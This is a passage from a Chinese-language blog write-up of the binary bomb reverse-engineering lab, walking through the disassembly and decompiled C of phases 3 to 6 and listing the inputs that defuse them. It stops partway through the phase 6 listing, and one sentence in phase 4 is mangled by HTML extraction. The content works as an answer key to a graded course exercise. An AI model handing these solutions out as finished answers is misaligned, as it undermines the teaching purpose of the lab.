<p>将phase_3函数逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_3</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> a, b;</div><div class="line">	<span class="keyword">int</span> val = <span class="built_in">sscanf</span>(input, <span class="string">"%d %d"</span>, &amp;a, &amp;b);</div><div class="line">	<span class="keyword">if</span> (val &lt;= <span class="number">1</span>) explode_bomb();</div><div class="line">	<span class="keyword">switch</span> (a) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">0</span>: a = <span class="number">207</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">1</span>: a = <span class="number">311</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">2</span>: a = <span class="number">707</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">3</span>: a = <span class="number">256</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">4</span>: a = <span class="number">389</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">5</span>: a = <span class="number">206</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">6</span>: a = <span class="number">682</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">7</span>: a = <span class="number">327</span>; <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>: explode_bomb(); a = <span class="number">0</span>; <span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (a != b) explode_bomb();</div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>根据逆向的结果，我们可以得知，本阶段要求输入2个数，且第1个数只能为0到7，且根据第1个数取值的不同，满足条件的第2个数的取值也不同，可能的答案如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">第1个数</th>
<th style="text-align:center">第2个数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">207</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">311</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">707</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">256</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">389</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">206</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">682</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">327</td>
</tr>
</tbody>
</table>
<p>在GDB中运行bomb并验证结果，结果正确。</p>
<h4 id="阶段4-phase-4"><a href="#阶段4-phase-4" class="headerlink" title="阶段4 - phase_4"></a>阶段4 - phase_4</h4><p>在bomb-disassemble中观察phase_4的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">000000000040100c &lt;phase_4&gt;:</div><div class="line">  40100c:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">  <span class="number">401010</span>:       <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c          <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</div><div class="line">  <span class="number">401015</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</div><div class="line">  40101a:       be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</div><div class="line">  40101f:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  <span class="number">401024</span>:       e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt; # 从输入的字符串中读取两个数字 并存入局部变量中</div><div class="line">  <span class="number">401029</span>:       <span class="number">83</span> f8 <span class="number">02</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%eax</div><div class="line">  40102c:       <span class="number">75</span> <span class="number">07</span>                   <span class="keyword">jne</span>    <span class="number">401035</span> &lt;phase_4+<span class="number">0x29</span>&gt; # 若数字不为两个 则引爆bomb</div><div class="line">  40102e:       <span class="number">83</span> 7c <span class="number">24</span> <span class="number">08</span> 0e          cmpl   <span class="number">$0</span>xe,<span class="number">0x8</span>(%rsp)</div><div class="line">  <span class="number">401033</span>:       <span class="number">76</span> <span class="number">05</span>                   <span class="keyword">jbe</span>    40103a &lt;phase_4+<span class="number">0x2e</span>&gt; # 若第一个数字大于<span class="number">14</span> 则引爆bomb</div><div class="line">  <span class="number">401035</span>:       e8 <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  40103a:       ba 0e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xe,%edx</div><div class="line">  40103f:       be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</div><div class="line">  <span class="number">401044</span>:       8b 7c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%edi</div><div class="line">  <span class="number">401048</span>:       e8 <span class="number">81</span> ff ff ff          callq  400fce &lt;func4&gt; # 调用func4</div><div class="line">  <span class="number">40104d</span>:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</div><div class="line">  40104f:       <span class="number">75</span> <span class="number">07</span>                   <span class="keyword">jne</span>    <span class="number">401058</span> &lt;phase_4+<span class="number">0x4c</span>&gt;</div><div class="line">  <span class="number">401051</span>:       <span class="number">83</span> 7c <span class="number">24</span> 0c <span class="number">00</span>          cmpl   <span class="number">$0</span>x0,<span class="number">0xc</span>(%rsp)</div><div class="line">  <span class="number">401056</span>:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     <span class="number">40105d</span> &lt;phase_4+<span class="number">0x51</span>&gt; # 当返回值和b均为<span class="number">0</span>时 解除阶段 否则 引爆bomb</div><div class="line">  <span class="number">401058</span>:       e8 <span class="built_in">dd</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  <span class="number">40105d</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">  <span class="number">401061</span>:       c3  </div></pre></td></tr></table></figure><br>可以注意到，phase_4的反汇编代码前半部分与phase_3相似，均是从输入的字符串中读入2个数字。</p>
<p>将phase_4逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_4</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> a, b;</div><div class="line">	<span class="keyword">int</span> val = <span class="built_in">sscanf</span>(input, <span class="string">"%d %d"</span>, &amp;a, &amp;b);</div><div class="line">	<span class="keyword">if</span> (val != <span class="number">2</span> || ((<span class="keyword">unsigned</span>)a &gt; <span class="number">14</span>)) explode_bomb();</div><div class="line">	val = func4(a, <span class="number">0</span>, <span class="number">14</span>);</div><div class="line">	<span class="keyword">if</span> (val != <span class="number">0</span> || b != <span class="number">0</span>) explode_bomb();</div><div class="line">	<span class="keyword">return</span>;</div></pre></td></tr></table></figure><br>从逆向的结果我们可以看出，phase_4从输入的字符串中读入2个数字a和b，并且a必须小于等于14且大于等于0，然后phase_4调用func4(a, 0, 14)，且只有该函数的返回值和b均为0时，该阶段解除。</p>
<p>现在我们将注意转向phase_4调用的func4函数，func4的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">0000000000400fce &lt;func4&gt;:</div><div class="line">  400fce:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">  400fd2:       <span class="number">89</span> d0                   <span class="keyword">mov</span>    %edx,%eax</div><div class="line">  400fd4:       <span class="number">29</span> f0                   <span class="keyword">sub</span>    %esi,%eax</div><div class="line">  400fd6:       <span class="number">89</span> c1                   <span class="keyword">mov</span>    %eax,%ecx</div><div class="line">  400fd8:       c1 e9 1f                <span class="keyword">shr</span>    <span class="number">$0</span>x1f,%ecx</div><div class="line">  400fdb:       <span class="number">01</span> c8                   <span class="keyword">add</span>    %ecx,%eax</div><div class="line">  400fdd:       d1 f8                   <span class="keyword">sar</span>    %eax</div><div class="line">  # 实际上是/<span class="number">2</span>过程，为了保证负数时舍入正确才使用了位移</div><div class="line">  400fdf:       <span class="number">8d</span> 0c <span class="number">30</span>                <span class="keyword">lea</span>    (%rax,%rsi,<span class="number">1</span>),%ecx</div><div class="line">  # %rax加上b</div><div class="line">  400fe2:       <span class="number">39</span> f9                   <span class="keyword">cmp</span>    %edi,%ecx</div><div class="line">  400fe4:       7e 0c                   <span class="keyword">jle</span>    400ff2 &lt;func4+<span class="number">0x24</span>&gt;</div><div class="line">  # if分支</div><div class="line">  400fe6:       <span class="number">8d</span> <span class="number">51</span> ff                <span class="keyword">lea</span>    -<span class="number">0x1</span>(%rcx),%edx</div><div class="line">  400fe9:       e8 e0 ff ff ff          callq  400fce &lt;func4&gt;</div><div class="line">  # 递归过程</div><div class="line">  400fee:       <span class="number">01</span> c0                   <span class="keyword">add</span>    %eax,%eax</div><div class="line">  400ff0:       eb <span class="number">15</span>                   <span class="keyword">jmp</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</div><div class="line">  400ff2:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  400ff7:       <span class="number">39</span> f9                   <span class="keyword">cmp</span>    %edi,%ecx</div><div class="line">  400ff9:       <span class="number">7d</span> 0c                   <span class="keyword">jge</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</div><div class="line">  400ffb:       <span class="number">8d</span> <span class="number">71</span> <span class="number">01</span>                <span class="keyword">lea</span>    <span class="number">0x1</span>(%rcx),%esi</div><div class="line">  400ffe:       e8 cb ff ff ff          callq  400fce &lt;func4&gt;</div><div class="line">  # 递归过程</div><div class="line">  <span class="number">401003</span>:       <span class="number">8d</span> <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>             <span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</div><div class="line">  <span class="number">401007</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">  40100b:       c3                      retq   </div></pre></td></tr></table></figure><br>观察反汇编的func4函数，发现func4函数中调用了func4函数自身，由此可以推测func4函数是一个递归过程。</p>
<p>将func4逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> returnVal = (c - b) / <span class="number">2</span>;</div><div class="line">	<span class="keyword">int</span> val = returnVal + b;</div><div class="line">	<span class="keyword">if</span> (val == a) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (val &lt; a) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span> * func4(a, val + <span class="number">1</span>, c) + <span class="number">1</span>;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span> * func4(a, b, val - <span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>观察func4的逆向结果，我们可以发现func4非常类似于二分查找的过程。要另func4的返回值为0，则一定不能让func4执行val<a的分支即必须一直保证(b+c) 2="">= a。考虑到0&lt;=a&lt;=14，所以满足条件的a有a=7 a=3 a=1 a=0 共4个。</a的分支即必须一直保证(b+c)></p>
<p>在GDB中运行bomb并验证结果，结果正确。</p>
<h4 id="阶段5-phase-5"><a href="#阶段5-phase-5" class="headerlink" title="阶段5 - phase_5"></a>阶段5 - phase_5</h4><p>在bomb-disassemble中观察phase_5的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000000000401062</span> &lt;phase_5&gt;:</div><div class="line">  <span class="number">401062</span>:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</div><div class="line">  <span class="number">401063</span>:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x20,%rsp</div><div class="line">  <span class="number">401067</span>:       <span class="number">48</span> <span class="number">89</span> fb                <span class="keyword">mov</span>    %rdi,%rbx</div><div class="line">  40106a:       <span class="number">64</span> <span class="number">48</span> 8b <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</div><div class="line">  <span class="number">401071</span>:       <span class="number">00</span> <span class="number">00</span></div><div class="line">  # 栈破坏检测机制</div><div class="line">  <span class="number">401073</span>:       <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>          <span class="keyword">mov</span>    %rax,<span class="number">0x18</span>(%rsp)</div><div class="line">  <span class="number">401078</span>:       <span class="number">31</span> c0                   <span class="keyword">xor</span>    %eax,%eax</div><div class="line">  40107a:       e8 9c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40131b &lt;string_length&gt;</div><div class="line">  # 计算输入字符串长度</div><div class="line">  40107f:       <span class="number">83</span> f8 <span class="number">06</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%eax</div><div class="line">  <span class="number">401082</span>:       <span class="number">74</span> 4e                   <span class="keyword">je</span>     4010d2 &lt;phase_5+<span class="number">0x70</span>&gt;</div><div class="line">  # 若长度不为<span class="number">6</span> 则引爆bomb</div><div class="line">  <span class="number">401084</span>:       e8 b1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  <span class="number">401089</span>:       eb <span class="number">47</span>                   <span class="keyword">jmp</span>    4010d2 &lt;phase_5+<span class="number">0x70</span>&gt;</div><div class="line">  40108b:       0f b6 0c <span class="number">03</span>             movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</div><div class="line">  40108f:       <span class="number">88</span> 0c <span class="number">24</span>                <span class="keyword">mov</span>    %cl,(%rsp)</div><div class="line">  <span class="number">401092</span>:       <span class="number">48</span> 8b <span class="number">14</span> <span class="number">24</span>             <span class="keyword">mov</span>    (%rsp),%rdx</div><div class="line">  <span class="number">401096</span>:       <span class="number">83</span> e2 0f                <span class="keyword">and</span>    <span class="number">$0</span>xf,%edx</div><div class="line">  <span class="number">401099</span>:       0f b6 <span class="number">92</span> b0 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>    movzbl <span class="number">0x4024b0</span>(%rdx),%edx</div><div class="line">  4010a0:       <span class="number">88</span> <span class="number">54</span> <span class="number">04</span> <span class="number">10</span>             <span class="keyword">mov</span>    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</div><div class="line">  实际上是a[i] = <span class="number">0x4024b0</span>[input[i] &amp; <span class="number">0xf</span>]</div><div class="line">  4010a4:       <span class="number">48</span> <span class="number">83</span> c0 <span class="number">01</span>             <span class="keyword">add</span>    <span class="number">$0</span>x1,%rax</div><div class="line">  4010a8:       <span class="number">48</span> <span class="number">83</span> f8 <span class="number">06</span>             <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%rax</div><div class="line">  4010ac:       <span class="number">75</span> <span class="built_in">dd</span>                   <span class="keyword">jne</span>    40108b &lt;phase_5+<span class="number">0x29</span>&gt;</div><div class="line">  # 循环以及条件判断</div><div class="line">  4010ae:       c6 <span class="number">44</span> <span class="number">24</span> <span class="number">16</span> <span class="number">00</span>          movb   <span class="number">$0</span>x0,<span class="number">0x16</span>(%rsp)</div><div class="line">  # 为构造的字符串尾部加上<span class="string">'\0'</span></div><div class="line">  4010b3:       be 5e <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x40245e,%esi</div><div class="line">  4010b8:       <span class="number">48</span> <span class="number">8d</span> 7c <span class="number">24</span> <span class="number">10</span>          <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</div><div class="line">  4010bd:       e8 <span class="number">76</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</div><div class="line">  # 调用strings_not_equal函数</div><div class="line">  4010c2:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</div><div class="line">  4010c4:       <span class="number">74</span> <span class="number">13</span>                   <span class="keyword">je</span>     4010d9 &lt;phase_5+<span class="number">0x77</span>&gt;</div><div class="line">  # 若返回值不为<span class="number">0</span> 则引爆bomb</div><div class="line">  4010c6:       e8 6f <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  4010cb:       0f 1f <span class="number">44</span> <span class="number">00</span> <span class="number">00</span>          nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</div><div class="line">  4010d0:       eb <span class="number">07</span>                   <span class="keyword">jmp</span>    4010d9 &lt;phase_5+<span class="number">0x77</span>&gt;</div><div class="line">  4010d2:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  4010d7:       eb b2                   <span class="keyword">jmp</span>    40108b &lt;phase_5+<span class="number">0x29</span>&gt;</div><div class="line">  4010d9:       <span class="number">48</span> 8b <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>          <span class="keyword">mov</span>    <span class="number">0x18</span>(%rsp),%rax</div><div class="line">  4010de:       <span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</div><div class="line">  4010e5:       <span class="number">00</span> <span class="number">00</span></div><div class="line">  4010e7:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     4010ee &lt;phase_5+<span class="number">0x8c</span>&gt;</div><div class="line">  4010e9:       e8 <span class="number">42</span> fa ff ff          callq  400b30 &lt;__stack_chk_fai</div><div class="line">l@plt&gt;</div><div class="line">  4010ee:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>             <span class="keyword">add</span>    <span class="number">$0</span>x20,%rsp</div><div class="line">  4010f2:       5b                      <span class="keyword">pop</span>    %rbx</div><div class="line">  4010f3:       c3                      retq   </div></pre></td></tr></table></figure><br>首先，我们注意到phase_5采用了栈破坏检测机制，并且设置了相应的哨兵值防止栈缓冲区溢出。<br>然后我们将phase_5逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_5</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</div><div class="line">	<span class="keyword">char</span> a[<span class="number">7</span>];</div><div class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(input) != <span class="number">6</span>) explode_bomb();</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">6</span> ; i++)</div><div class="line">		a[i] = <span class="number">0x4024b0</span>[input[i] &amp; <span class="number">0xf</span>];</div><div class="line">	a[<span class="number">6</span>] = <span class="string">'\0'</span>;</div><div class="line">	<span class="keyword">int</span> val = strings_not_equal(a, <span class="number">0x40245e</span>);</div><div class="line">	<span class="keyword">if</span> (val != <span class="number">0</span>) explode_bomb();</div><div class="line">	<span class="keyword">return</span>;</div></pre></td></tr></table></figure><br>在GDB中打印0x4024b0和0x40245e所对应的字符串，命令和结果如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">print</span> (char *)0x4024b0</div><div class="line"><span class="variable">$1</span> = 0x4024b0 &lt;array&gt; <span class="string">"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"</span></div><div class="line">(gdb) <span class="built_in">print</span> (char *)0x40245e</div><div class="line"><span class="variable">$2</span> = 0x40245e <span class="string">"flyers"</span></div></pre></td></tr></table></figure><br>可以看出，phase_5实际上是phase_1的提高。</p>
<p>phase_5要求输入一个6个字符的字符串，通过将取出输入字符串中每个字符的后四位当做偏移地址，以该偏移地址取出地址为0x4024b0处的字符数组中对应的字符，并依次保存在临时数组a中构造一个新的字符串。<br>再将这个新的字符串与0x40245e处的字符串相比较，如果两个字符串相等，则该阶段解除。</p>
<p>0x40245e处的字符串为”flyers”，其每个字符在0x4024b0处的字符数组”maduiersnfotvbyl”中的对应的偏移量为9,15,14,5,6,7。因此只要输入的字符串的后四位换算成10进制分别为9,15,14,5,6,7即可。</p>
<p>本phase的答案不唯一。一个可能的答案为”yo~uvw”，在GDB中运行bomb并验证结果，结果正确。</p>
<h4 id="阶段6-phase-6"><a href="#阶段6-phase-6" class="headerlink" title="阶段6 - phase_6"></a>阶段6 - phase_6</h4><p>本phase是所有phase中最难的一个，但是仍然需要一步一步的分解反汇编代码，并最终得到正确的字符串。<br>在bomb-disassemble中观察phase_6的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line">00000000004010f4 &lt;phase_6&gt;:</div><div class="line">  4010f4:       <span class="number">41</span> <span class="number">56</span>                   <span class="keyword">push</span>   %r14</div><div class="line">  4010f6:       <span class="number">41</span> <span class="number">55</span>                   <span class="keyword">push</span>   %r13</div><div class="line">  4010f8:       <span class="number">41</span> <span class="number">54</span>                   <span class="keyword">push</span>   %r12</div><div class="line">  4010fa:       <span class="number">55</span>                      <span class="keyword">push</span>   %rbp</div><div class="line">  4010fb:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</div><div class="line">  4010fc:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">50</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x50,%rsp</div><div class="line">  <span class="number">401100</span>:       <span class="number">49</span> <span class="number">89</span> e5                <span class="keyword">mov</span>    %rsp,%r13</div><div class="line">  <span class="number">401103</span>:       <span class="number">48</span> <span class="number">89</span> e6                <span class="keyword">mov</span>    %rsp,%rsi</div><div class="line">  <span class="number">401106</span>:       e8 <span class="number">51</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40145c &lt;read_six_numbers&gt;</div><div class="line">  # 读入<span class="number">6</span>个<span class="keyword">int</span>型数字</div><div class="line">  40110b:       <span class="number">49</span> <span class="number">89</span> e6                <span class="keyword">mov</span>    %rsp,%r14</div><div class="line">  40110e:       <span class="number">41</span> bc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    <span class="number">$0</span>x0,%r12d</div><div class="line">  <span class="number">401114</span>:       4c <span class="number">89</span> ed                <span class="keyword">mov</span>    %r13,%rbp</div><div class="line">  <span class="number">401117</span>:       <span class="number">41</span> 8b <span class="number">45</span> <span class="number">00</span>             <span class="keyword">mov</span>    <span class="number">0x0</span>(%r13),%eax</div><div class="line">  40111b:       <span class="number">83</span> e8 <span class="number">01</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x1,%eax</div><div class="line">  40111e:       <span class="number">83</span> f8 <span class="number">05</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax</div><div class="line">  <span class="number">401121</span>:       <span class="number">76</span> <span class="number">05</span>                   <span class="keyword">jbe</span>    <span class="number">401128</span> &lt;phase_6+<span class="number">0x34</span>&gt;</div><div class="line">  <span class="number">401123</span>:       e8 <span class="number">12</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  # 判断数字必须小于等于<span class="number">6</span></div><div class="line">  <span class="number">401128</span>:       <span class="number">41</span> <span class="number">83</span> c4 <span class="number">01</span>             <span class="keyword">add</span>    <span class="number">$0</span>x1,%r12d</div><div class="line">  40112c:       <span class="number">41</span> <span class="number">83</span> fc <span class="number">06</span>             <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%r12d</div><div class="line">  <span class="number">401130</span>:       <span class="number">74</span> <span class="number">21</span>                   <span class="keyword">je</span>     <span class="number">401153</span> &lt;phase_6+<span 